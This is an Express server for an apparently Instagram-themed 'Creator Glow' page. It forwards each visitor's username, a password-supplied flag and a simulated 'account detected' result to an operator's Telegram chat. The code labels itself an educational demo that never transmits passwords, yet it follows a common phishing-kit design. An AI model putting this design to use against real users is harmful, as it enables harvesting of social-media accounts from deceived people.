const express=require("express");
const path=require("path");
const crypto=require("crypto");
const app=express();

app.use(express.json({limit:"20kb"}));
app.use(express.static(__dirname));

const cleanUsername=value=>String(value||"").trim().replace(/^@/,"").replace(/[^a-zA-Z0-9._]/g,"").slice(0,30);

async function notifyDemoCheck({username,demoId,timestamp,passwordSupplied}){
  const token=process.env.TELEGRAM_BOT_TOKEN;
  const chat=process.env.TELEGRAM_CHAT_ID;
  const backendResult=[
    "🎭 Creator Glow — Backend Demo Record",
    "",
    "🔎 Account detected: TRUE (SIMULATED)",
    "👤 Username: @"+username,
    "🔐 Password supplied: "+(passwordSupplied?"TRUE":"FALSE"),
    "🚫 Password transmitted: FALSE",
    "🚫 Real Instagram verification: FALSE",
    "✅ Demo simulation: TRUE",
    "🆔 Demo ID: "+demoId,
    "🕒 Timestamp: "+timestamp,
    "",
    "ℹ️ Educational simulation only. The actual password value is never received, stored, or sent."
  ].join("\n");
  console.log("\n"+backendResult+"\n");
  if(!token||!chat){
    console.log("Telegram not configured; backend record was logged locally.");
    return {sent:false,reason:"Telegram is not configured"};
  }
  try{
    const response=await fetch("https://api.telegram.org/bot"+token+"/sendMessage",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:chat,text:backendResult})
    });
    if(!response.ok) throw new Error("Telegram returned "+response.status);
    return {sent:true};
  }catch(error){
    console.error("Telegram notification error:",error.message);
    return {sent:false,reason:"Notification could not be sent"};
  }
}

app.get("/health",(req,res)=>res.status(200).json({ok:true,status:"running"}));

app.post("/api/demo-check",async(req,res)=>{
  const username=cleanUsername(req.body?.username);
  if(username.length<1) return res.status(400).json({ok:false,error:"Please enter a valid username."});
  const passwordSupplied=req.body?.passwordSupplied===true;
  const demoId=crypto.randomUUID();
  const timestamp=new Date().toISOString();
  const notification=await notifyDemoCheck({username,demoId,timestamp,passwordSupplied});
  res.status(200).json({ok:true,mode:"demo",message:"Demo started.",notificationSent:notification.sent});
});

app.use((req,res)=>res.sendFile(path.join(__dirname,"index.html")));

const port=Number(process.env.PORT)||3000;
app.listen(port,"0.0.0.0",()=>console.log("Creator Glow running on port "+port));